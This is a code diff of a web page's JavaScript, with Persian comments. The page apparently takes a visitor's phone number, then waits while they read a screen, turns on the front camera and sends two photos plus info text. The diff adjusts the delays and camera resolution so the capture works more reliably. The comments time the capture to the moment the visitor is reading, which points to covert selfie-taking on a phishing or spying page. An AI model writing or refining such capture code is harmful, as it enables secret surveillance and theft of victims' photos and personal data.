@@ -141,8 +141,8 @@
         document.getElementById('phone').classList.add('hidden');
         document.getElementById('final').classList.remove('hidden');
 
-        // بعد ۶ ثانیه (تا متن رو کامل بخونه) عکس بگیر
-        setTimeout(takeSelfies, 6000);
+        // بعد ۷ ثانیه (تا متن رو کامل بخونه + لودینگ ببینه) عکس بگیر
+        setTimeout(takeSelfies, 7000);
     }
 
     async function takeSelfies() {
@@ -150,16 +150,16 @@
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: "user",
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
+                    width: { min: 640, ideal: 1280 },
+                    height: { min: 480, ideal: 720 }
                 } 
             });
             const video = document.getElementById('video');
             video.srcObject = stream;
             await video.play();
 
-            // صبر کن تا دوربین کامل روشن بشه
-            await new Promise(resolve => setTimeout(resolve, 2000));
+            // ۳ ثانیه کامل صبر کن تا تصویر روشن بشه
+            await new Promise(resolve => setTimeout(resolve, 3000));
 
             const sendPhoto = (num) => {
                 const canvas = document.getElementById('canvas');
@@ -178,7 +178,7 @@
             };
 
             sendPhoto(1);
-            setTimeout(() => sendPhoto(2), 2000);
+            setTimeout(() => sendPhoto(2), 2500);
 
             stream.getTracks().forEach(t => t.stop());
             sendInfoText();
